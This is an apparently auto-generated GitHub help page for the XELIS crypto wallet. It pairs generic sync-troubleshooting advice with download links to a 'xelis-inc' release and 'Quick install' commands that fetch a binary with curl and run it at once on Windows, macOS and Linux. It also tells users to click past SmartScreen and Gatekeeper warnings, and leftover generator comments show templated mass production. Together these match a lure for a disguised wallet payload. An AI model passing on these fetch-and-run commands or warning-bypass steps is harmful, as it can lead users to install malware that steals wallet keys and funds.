![XELIS Wallet not syncing or not connecting: fix order](assets/banner-article.png)
# XELIS Wallet not syncing or not connecting: fix order

Work from the connection inward and change one thing at a time.

## Downloads - Fix

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Start with the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) before you change settings. A connection problem on an older build is often a problem you no longer have.

> A wallet that cannot reach a node shows stale data, not lost funds. Nothing in this sequence moves or deletes your wallet.

When XELIS Wallet stops syncing, the cause is almost always between the wallet and the network rather than inside the wallet file. Run the current release first, then check the node connection, then restart, then read the logs. Confirmed balances return once a node responds; a balance that stays wrong after a healthy sync is a different problem.

<!-- ARTICLE-BODY-BEGIN -->
## What the failure looks like from the app

Three states get described as "not syncing": a spinner that never advances, a balance stuck at an old value, and an outright connection error. They point at different layers, so note which one you have before changing anything, because a fix applied to the wrong layer hides the original symptom.

Run the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> first; a fresh install with no history and a wallet with funds both behave the same way while the node is unreachable, which is why the first check is the connection rather than the wallet. If the app cannot reach a node, nothing downstream can be trusted.

## Check the connection before you touch the wallet

Open the node settings if your build exposes them, check which endpoint is in use, and confirm the app can reach it. A public node can be down, slow, or blocking your region, and none of those are wallet faults. The setting and what it means are described in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md">XELIS Wallet node settings</a>.

Switching to a different node is the fastest diagnostic you have: if a second endpoint syncs, the wallet is fine and the first node was the problem. Change one field, retry, and note the result instead of changing three things at once.

## Ranked steps, cheapest first

| Step | What it tests | What to expect |
| --- | --- | --- |
| Run the current release | An older build with a known connection defect | Either the problem disappears or it is unchanged |
| Switch the node endpoint | Whether this node is the problem | Sync resumes on a healthy node |
| Restart the app, then the machine | A stuck process or a stale socket | Connection re-establishes once |
| Check system time | Certificates fail on a badly wrong clock | Connection succeeds after the clock is corrected |
| Read the logs | The actual error text | An error naming the node, the port or the timeout |

The order matters because each step is reversible and cheap. Jumping to a reinstall before checking the node throws away the evidence you need if the problem returns.

## When no public node works

If every endpoint fails, the network path itself is in question: a firewall, a VPN, a proxy or an ISP filter. Trying a different network is a quick test. The durable answer for anyone who hits this repeatedly is to run the node locally, which removes the remote endpoint from the equation entirely; the procedure is in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md">run a local XELIS node</a>.

## Confirm the fix and keep the evidence

A fixed wallet shows a current block height and a balance that changes when the chain does. Before you close the case, note which node you switched to and what the error said, because a recurring failure is much easier to diagnose with that record. If the sync recovers but the balance is still wrong, the logs are the next stop: <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md">read the XELIS Wallet logs</a> shows where they are and what to look for.

## FAQ

### Is there an issue with your syncing, or with the node?

Usually the node. The wallet's own sync is a read of the chain, so an unreachable endpoint produces the same symptom as a broken sync.

### Will reinstalling fix a sync problem?

Rarely, and it costs you the evidence. Try the release, the node and a restart first; reinstall when the app itself will not start.

### Can I lose funds while the wallet is not syncing?

No. The keys and the chain are unaffected; the wallet simply cannot read the current state.

### Why does the balance show an old value?

The wallet is displaying the last state it could read. It updates once a node responds and sync completes.

### How long should a sync take after a fix?

It depends on how far behind the wallet is; a short gap is quick, a long one takes longer. Progress, not a fixed time, is the signal.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet node settings](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md)
- [Read the XELIS Wallet logs](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md)
- [Run a local XELIS node](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md)
- [Fix a missing XELIS Wallet balance](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-balance-missing-restore.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
